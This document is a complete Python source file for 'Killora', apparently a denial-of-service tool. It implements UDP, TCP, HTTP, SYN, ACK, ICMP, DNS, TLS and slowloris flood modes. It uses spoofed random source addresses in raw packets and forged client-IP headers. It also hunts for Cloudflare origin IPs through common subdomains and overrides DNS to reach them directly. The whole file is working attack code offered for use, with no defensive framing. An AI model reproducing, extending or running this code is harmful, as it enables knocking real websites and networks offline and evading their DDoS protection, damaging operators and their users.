#!/usr/bin/env python3
# killora.py - engine for Killora by BrokenCodeZ
import asyncio, ipaddress, os, random, socket, ssl, struct, sys, time

CF_NETS = [ipaddress.ip_network(n) for n in (
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
    "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
    "197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
    "2400:cb00::/32", "2606:4700::/32", "2803:f800::/32", "2405:b500::/32",
    "2405:8100::/32", "2a06:98c0::/29", "2c0f:f248::/32",
)]

SUBS = ["direct", "origin", "origin-www", "direct-www", "ftp", "mail", "ssh",
        "cpanel", "webmail", "dev", "staging", "api", "backend", "old", "new",
        "server", "host", "portal", "admin", "vpn", "internal", "gateway"]

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36",
]
C1 = "\033[1;36m"; C2 = "\033[1;35m"; C3 = "\033[1;33m"
C4 = "\033[1;32m"; CR = "\033[1;31m"; N = "\033[0m"


class Cfg:
    def __init__(self, host, port, count):
        self.host = host
        self.port = port
        self.count = count
        self.sent = 0
        self.fail = 0
        self.bytes = 0
        self.ip = None
        self.stop = False
        self.t0 = time.monotonic()


def is_cf(ip):
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(a.version == n.version and a in n for n in CF_NETS)


def resolve(host):
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror:
        return []
    out = []
    for info in infos:
        ip = info[4][0]
        if ip not in out:
            out.append(ip)
    return out


def override_dns(host, ip):
    real = socket.getaddrinfo
    def patched(h, p, *a, **k):
        return real(ip if h == host else h, p, *a, **k)
    socket.getaddrinfo = patched


def csum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def rnd_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


def tcp_pkt(src, dst, sport, dport, flags):
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535),
                     0x4000, 64, socket.IPPROTO_TCP, 0,
                     socket.inet_aton(src), socket.inet_aton(dst))
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    tcp = struct.pack("!HHIIBBHHH", sport, dport, random.randint(0, 2**32 - 1),
                      0, 0x50, flags, 65535, 0, 0)
    ph = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst),
                     0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", csum(ph + tcp)) + tcp[18:]
    return ip + tcp


def dns_pkt(name):
    hdr = struct.pack("!HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
    q = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
    return hdr + q + struct.pack("!HH", random.choice((1, 28)), 1)


def icmp_pkt():
    ident, seq, payload = random.randint(0, 65535), random.randint(0, 65535), os.urandom(32)
    hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
    return struct.pack("!BBHHH", 8, 0, csum(hdr + payload), ident, seq) + payload


def cf_headers():
    h = {}
    for k in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP",
              "True-Client-IP", "X-Originating-IP", "Client-IP"):
        h[k] = rnd_ip()
    h["Forwarded"] = "for=" + rnd_ip()
    return h


def bust():
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))


async def reporter(cfg):
    last = 0
    while not cfg.stop:
        await asyncio.sleep(1)
        done = cfg.sent + cfg.fail
        print("  %s[%5.1fs]%s sent=%d fail=%d rate=%d/s data=%.1fMB"
              % (C1, time.monotonic() - cfg.t0, N, cfg.sent, cfg.fail,
                 done - last, cfg.bytes / 1e6), flush=True)
        last = done


def summary(cfg):
    el = time.monotonic() - cfg.t0
    print("\n  %sDONE%s  sent=%d  fail=%d  %.1fs  avg=%.0f/s  %.1fMB"
          % (C4, N, cfg.sent, cfg.fail, el, cfg.sent / max(el, 0.01), cfg.bytes / 1e6))


async def drive(cfg, worker, n):
    rep = asyncio.create_task(reporter(cfg))
    await asyncio.gather(*[asyncio.create_task(worker()) for _ in range(n)],
                         return_exceptions=True)
    cfg.stop = True
    await asyncio.sleep(1.05)
    rep.cancel()
    summary(cfg)


def need_root():
    if os.geteuid() != 0:
        print(CR + "  root chahiye: sudo se chalao" + N)
        sys.exit(1)


# ---------------------------------------------------------------- UDP
async def udp_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    payload = os.urandom(1024)
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            s.sendto(payload, (cfg.ip, cfg.port))
            cfg.bytes += 1024
        except OSError:
            cfg.fail += 1
        cfg.sent += 1
        if cfg.sent % 512 == 0:
            await asyncio.sleep(0)


# ---------------------------------------------------------------- TCP
async def tcp_worker(cfg):
    req = b"GET / HTTP/1.1\r\nHost: " + cfg.host.encode() + b"\r\n\r\n"
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(cfg.ip, cfg.port), 5)
            w.write(req)
            await asyncio.wait_for(w.drain(), 5)
            w.close()
            cfg.sent += 1
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


# ---------------------------------------------------------------- HTTP
async def http_worker(cfg, session, sem, cf):
    base = "%s://%s:%d/" % ("https" if cfg.port == 443 else "http", cfg.host, cfg.port)
    while cfg.sent < cfg.count and not cfg.stop:
        h = {"User-Agent": random.choice(UA),
             "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9",
             "Accept-Encoding": "gzip, deflate, br",
             "Connection": "keep-alive",
             "Cache-Control": "no-cache",
             "Pragma": "no-cache",
             "Referer": base}
        if cf:
            h.update(cf_headers())
        url = base + "?" + bust()
        async with sem:
            try:
                async with session.get(url, headers=h, allow_redirects=False,
                                       timeout=None) as r:
                    body = await r.read()
                    cfg.bytes += len(body) + 400
                    cfg.sent += 1
            except Exception:
                cfg.fail += 1
                cfg.sent += 1


# ---------------------------------------------------------------- raw
async def syn_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            s.sendto(tcp_pkt(rnd_ip(), cfg.ip, random.randint(1024, 65535),
                             cfg.port, 0x02), (cfg.ip, 0))
        except OSError:
            cfg.fail += 1
        cfg.sent += 1
        if cfg.sent % 1000 == 0:
            await asyncio.sleep(0)


async def ack_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            s.sendto(tcp_pkt(rnd_ip(), cfg.ip, random.randint(1024, 65535),
                             cfg.port, 0x10), (cfg.ip, 0))
        except OSError:
            cfg.fail += 1
        cfg.sent += 1
        if cfg.sent % 1000 == 0:
            await asyncio.sleep(0)


async def icmp_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            s.sendto(icmp_pkt(), (cfg.ip, 0))
            cfg.bytes += 40
        except OSError:
            cfg.fail += 1
        cfg.sent += 1
        if cfg.sent % 500 == 0:
            await asyncio.sleep(0)


# ---------------------------------------------------------------- DNS
async def dns_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            s.sendto(dns_pkt("%s.%s" % (bust(), cfg.host)), (cfg.ip, cfg.port))
            cfg.bytes += 60
        except OSError:
            cfg.fail += 1
        cfg.sent += 1
        if cfg.sent % 256 == 0:
            await asyncio.sleep(0)


# ---------------------------------------------------------------- TLS
async def tls_worker(cfg):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers("DEFAULT@SECLEVEL=1")
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(cfg.ip, cfg.port, ssl=ctx,
                                        server_hostname=cfg.host), 6)
            w.close()
            cfg.sent += 1
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


# ---------------------------------------------------------------- slowloris
async def slow_worker(cfg):
    host = cfg.host.encode()
    while cfg.sent < cfg.count and not cfg.stop:
        try:
            r, w = await asyncio.open_connection(cfg.ip, cfg.port)
            w.write(b"GET /?" + bust().encode() + b" HTTP/1.1\r\nHost: " + host +
                    b"\r\nUser-Agent: " + random.choice(UA).encode() + b"\r\n")
            await w.drain()
            cfg.sent += 1
            for _ in range(40):
                if cfg.stop or cfg.sent >= cfg.count:
                    break
                await asyncio.sleep(4)
                w.write(b"X-k: " + bust().encode() + b"\r\n")
                await w.drain()
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


# ---------------------------------------------------------------- bypass hunt
def hunt_origin(domain):
    print("  %s[*]%s Cloudflare check + origin hunt: %s" % (C3, N, domain))
    bare = resolve(domain)
    if bare:
        print("    %s %s" % (("CF" if is_cf(bare[0]) else "DIRECT"), ", ".join(bare[:3])))
    found = [ip for ip in bare if not is_cf(ip)]
    for sub in SUBS:
        cand = "%s.%s" % (sub, domain)
        for ip in resolve(cand):
            if is_cf(ip) or ip in found:
                continue
            found.append(ip)
            print("    %s+%s origin: %s -> %s" % (C4, N, cand, ip))
    if found:
        print("  %s[+]%s origin mile: %s" % (C4, N, found[0]))
        return found[0]
    print("  %s[-]%s origin nahi mila, CF edge pe hi maarenge" % (CR, N))
    return None


def http_session(cfg):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


async def main():
    if len(sys.argv) < 5:
        sys.exit("usage: killora.py <mode> <host> <port> <count>")
    mode, host, port, count = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4])

    cfg = Cfg(host, port, count)
    print("\n  %sKILLORA%s -> %s:%d  mode=%s  count=%d\n" % (C2, N, host, port, mode, count))

    ips = resolve(host)
    if not ips:
        sys.exit(CR + "  resolve fail: " + host + N)
    cfg.ip = ips[0]

    if mode == "check":
        print("  IPs: " + ", ".join(ips))
        print("  Cloudflare: " + (CR + "YES" + N if any(is_cf(i) for i in ips) else C4 + "NO" + N))
        hunt_origin(host)
        try:
            s = socket.create_connection((cfg.ip, 80), 3)
            s.close()
            print("  port 80: open")
        except OSError:
            print("  port 80: closed/filtered")
        return

    if mode in ("syn", "ack", "icmp"):
        need_root()

    if mode in ("udp", "tcp", "syn", "ack", "icmp", "dns", "tls", "slow"):
        workers = 4 if mode in ("udp", "tcp", "dns") else 2
        fn = {"udp": udp_worker, "tcp": tcp_worker, "syn": syn_worker,
              "ack": ack_worker, "icmp": icmp_worker, "dns": dns_worker,
              "tls": tls_worker, "slow": slow_worker}[mode]
        await drive(cfg, lambda: fn(cfg), workers)

    elif mode in ("http", "cf"):
        import aiohttp
        if mode == "cf":
            origin = hunt_origin(host)
            if origin:
                override_dns(host, origin)
        ctx = http_session(cfg)
        conn = aiohttp.TCPConnector(limit=0, ssl=ctx, force_close=False,
                                    enable_cleanup_closed=True)
        sem = asyncio.Semaphore(300)
        async with aiohttp.ClientSession(connector=conn) as sess:
            await drive(cfg, lambda: http_worker(cfg, sess, sem, mode == "cf"), 300)

    elif mode == "mixed":
        need_root()
        share = count // 4
        sub = [Cfg(host, port, share) for _ in range(4)]
        for c in sub:
            c.ip = cfg.ip
        cfg.stop = False
        rep = asyncio.create_task(reporter(cfg))
        tasks = []
        for c, fn in zip(sub, (udp_worker, tcp_worker, syn_worker, icmp_worker)):
            for _ in range(2):
                tasks.append(asyncio.create_task(fn(c)))
        await asyncio.gather(*tasks, return_exceptions=True)
        cfg.stop = True
        cfg.sent = sum(c.sent for c in sub)
        cfg.fail = sum(c.fail for c in sub)
        cfg.bytes = sum(c.bytes for c in sub)
        await asyncio.sleep(1.05)
        rep.cancel()
        summary(cfg)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n  interrupted")